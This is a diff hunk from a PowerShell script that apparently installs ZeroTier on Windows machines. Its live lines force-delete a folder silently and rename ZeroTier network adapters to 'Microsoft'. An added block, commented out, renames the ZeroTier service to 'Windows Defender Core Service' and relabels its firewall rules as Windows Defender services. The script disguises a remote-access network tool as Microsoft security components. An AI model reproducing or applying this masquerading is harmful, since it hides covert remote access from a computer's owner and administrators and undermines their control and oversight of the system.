@@ -53,3 +53,31 @@ Set-Acl -Path $item.FullName -AclObject $folderACL
 }
 Remove-Item -Path $folderPath -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
 Get-NetAdapter -Name Zerotier*|Rename-NetAdapter -NewName Microsoft
+#ZT Adv Fix
+#$ztadv = Read-Host "Proceed With ZT Adv Fix (y/n)"
+#if ([string]::IsNullOrEmpty($ztadv)) {
+#    Start-Sleep -Seconds 1
+#    $ztadv = "n"	
+#}
+#if ($ztadv.ToLower() -eq "y") {
+#    Write-Host "Executing ZT Adv Fix..."
+#	$ztregkey = "HKLM:\SYSTEM\CurrentControlSet\Services\ZeroTierOneService"
+#	Set-ItemProperty -Path $ztregkey -Name "DisplayName" -Value "Windows Defender Core Service"
+#	Set-ItemProperty -Path $ztregkey -Name "Description" -Value "Windows Defender Essential Services"
+#	$ruleName = "ZeroTier x64 Binary In"
+#	$existingRule = Get-NetFirewallRule | Where-Object { $_.DisplayName -eq $ruleName }
+#	if ($existingRule) {
+#		$newRuleName = "Windoes Defender Core Service"
+#		Set-NetFirewallRule -DisplayName $ruleName -NewDisplayName $newRuleName -ErrorAction SilentlyContinue
+#		Set-NetFirewallRule -DisplayName $newRuleName -ErrorAction SilentlyContinue
+#	}
+#	$ruleName2 = "ZeroTier UDP/9993 In"
+#	$existingRule2 = Get-NetFirewallRule | Where-Object { $_.DisplayName -eq $ruleName2 }
+#	if ($existingRule2) {
+#		$newRuleName2 = "Windows Defender Service"
+#		Set-NetFirewallRule -DisplayName $ruleName2 -NewDisplayName $newRuleName2 -ErrorAction SilentlyContinue
+#		Set-NetFirewallRule -DisplayName $newRuleName2 -ErrorAction SilentlyContinue
+#	}	
+#	Restart-Service ZeroTierOneService
+#} else {
+#}
